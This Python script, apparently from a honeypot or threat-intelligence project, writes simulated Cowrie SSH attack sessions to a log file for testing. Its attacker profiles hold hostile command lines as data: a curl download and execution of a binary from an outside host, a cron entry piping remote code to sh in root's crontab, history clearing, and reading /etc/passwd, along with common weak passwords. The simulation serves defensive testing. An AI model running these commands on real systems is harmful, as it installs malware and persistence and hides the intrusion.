import sys
import json
import time
import uuid
import random
import datetime
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(BASE_DIR))

from config.settings import settings

# Realistic attacker IP pools and profile data
ATTACKER_PROFILES = [
    {
        "ip": "185.220.101.5",
        "country": "Germany",
        "behavior": "cryptominer_dropper",
        "usernames": ["root", "admin", "test"],
        "commands": [
            "uname -m",
            "cat /proc/cpuinfo | grep 'processor' | wc -l",
            "cd /tmp || cd /var/tmp",
            "curl -O http://185.220.101.5/bins/x86_64",
            "chmod +x x86_64 && ./x86_64 >/dev/null 2>&1 &",
            "history -c"
        ]
    },
    {
        "ip": "194.26.29.112",
        "country": "Russia",
        "behavior": "lateral_recon",
        "usernames": ["root", "ubuntu", "oracle", "deploy"],
        "commands": [
            "whoami",
            "id",
            "uname -a",
            "cat /etc/issue",
            "netstat -antp",
            "ps -ef | grep python",
            "cat /etc/passwd"
        ]
    },
    {
        "ip": "45.155.205.233",
        "country": "Netherlands",
        "behavior": "persistence_hunter",
        "usernames": ["support", "git", "jenkins", "root"],
        "commands": [
            "id",
            "crontab -l",
            "echo '*/5 * * * * curl -s http://45.155.205.233/sh | sh' > /tmp/cron",
            "cat /tmp/cron >> /var/spool/cron/crontabs/root",
            "sudo -l",
            "iptables -L -n"
        ]
    },
    {
        "ip": "114.119.130.88",
        "country": "China",
        "behavior": "credential_stuffing",
        "usernames": ["root", "admin", "user", "guest", "test1", "pi"],
        "commands": [
            "ls -la",
            "pwd",
            "exit"
        ]
    },
    {
        "ip": "198.51.100.42",
        "country": "United States",
        "behavior": "cloud_port_scanner",
        "usernames": ["ec2-user", "ubuntu", "centos", "root"],
        "commands": [
            "echo ping",
            "exit"
        ]
    }
]

PASSWORDS = [
    "admin123", "password", "123456", "root", "toor", "12345678", "qwerty", "system", "pass123"
]

def append_cowrie_log(event_data: dict, log_path: Path):
    """Appends single JSON event to Cowrie log file in real-time format."""
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event_data) + "\n")

def simulate_single_attack(log_path: Path = None, delay_between_steps: float = 0.5):
    """Simulates an authentic Cowrie multi-stage attacker session."""
    if log_path is None:
        log_path = settings.COWRIE_LOG_PATH

    profile = random.choice(ATTACKER_PROFILES)
    session_id = uuid.uuid4().hex[:12]
    src_ip = profile["ip"]
    src_port = random.randint(30000, 65000)
    dst_port = 2222

    now_iso = lambda: datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")

    print(f"\n[ATTACK SIMULATION] Starting session {session_id} from {src_ip} ({profile['country']})")

    # Step 1: Connection event
    conn_event = {
        "eventid": "cowrie.session.connect",
        "message": f"New connection: {src_ip}:{src_port} (127.0.0.1:{dst_port}) [session: {session_id}]",
        "src_ip": src_ip,
        "src_port": src_port,
        "dst_port": dst_port,
        "session": session_id,
        "timestamp": now_iso()
    }
    append_cowrie_log(conn_event, log_path)
    time.sleep(delay_between_steps)

    # Step 2: Failed login attempts (Brute-force / Enumeration)
    failed_attempts = random.randint(2, 5)
    for _ in range(failed_attempts):
        u = random.choice(profile["usernames"])
        p = random.choice(PASSWORDS)
        fail_event = {
            "eventid": "cowrie.login.failed",
            "message": f"login attempt [{u}/{p}] failed",
            "username": u,
            "password": p,
            "src_ip": src_ip,
            "src_port": src_port,
            "session": session_id,
            "timestamp": now_iso()
        }
        append_cowrie_log(fail_event, log_path)
        print(f"  [-] Login failed: user '{u}' with password attempt")
        time.sleep(delay_between_steps)

    # Step 3: Login Success
    succ_user = random.choice(profile["usernames"])
    succ_pass = "root123"
    succ_event = {
        "eventid": "cowrie.login.success",
        "message": f"login attempt [{succ_user}/{succ_pass}] succeeded",
        "username": succ_user,
        "password": succ_pass,
        "src_ip": src_ip,
        "src_port": src_port,
        "session": session_id,
        "timestamp": now_iso()
    }
    append_cowrie_log(succ_event, log_path)
    print(f"  [+] Login SUCCESS: user '{succ_user}' gained shell access!")
    time.sleep(delay_between_steps)

    # Step 4: Command execution
    for cmd in profile["commands"]:
        cmd_event = {
            "eventid": "cowrie.command.input",
            "message": f"CMD: {cmd}",
            "input": cmd,
            "src_ip": src_ip,
            "src_port": src_port,
            "session": session_id,
            "timestamp": now_iso()
        }
        append_cowrie_log(cmd_event, log_path)
        print(f"  [>] Executed: {cmd}")
        time.sleep(delay_between_steps)

    # Step 5: Session Closed
    duration = random.randint(15, 120)
    closed_event = {
        "eventid": "cowrie.session.closed",
        "message": f"Connection lost after {duration} seconds",
        "duration": duration,
        "src_ip": src_ip,
        "src_port": src_port,
        "session": session_id,
        "timestamp": now_iso()
    }
    append_cowrie_log(closed_event, log_path)
    print(f"  [x] Session {session_id} closed (Duration: {duration}s)")

def run_continuous_simulation(interval: int = 10, total_attacks: int = 0):
    """
    Runs automated attack simulation continuously at specified interval.
    If total_attacks == 0, runs indefinitely.
    """
    print(f"[*] Starting IHTIP Attack Simulation Daemon (Interval: {interval}s)...")
    print(f"[*] Log target: {settings.COWRIE_LOG_PATH}")
    count = 0
    try:
        while True:
            simulate_single_attack(delay_between_steps=0.2)
            count += 1
            if total_attacks > 0 and count >= total_attacks:
                break
            print(f"[*] Waiting {interval} seconds until next attack...")
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[*] Attack simulation stopped by user.")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="IHTIP Cowrie SSH Attack Simulator")
    parser.add_argument("--interval", type=int, default=8, help="Interval in seconds between attack sessions")
    parser.add_argument("--count", type=int, default=1, help="Number of attacks to simulate (0 for infinite loop)")
    args = parser.parse_args()

    if args.count == 1:
        simulate_single_attack()
    else:
        run_continuous_simulation(interval=args.interval, total_attacks=args.count)

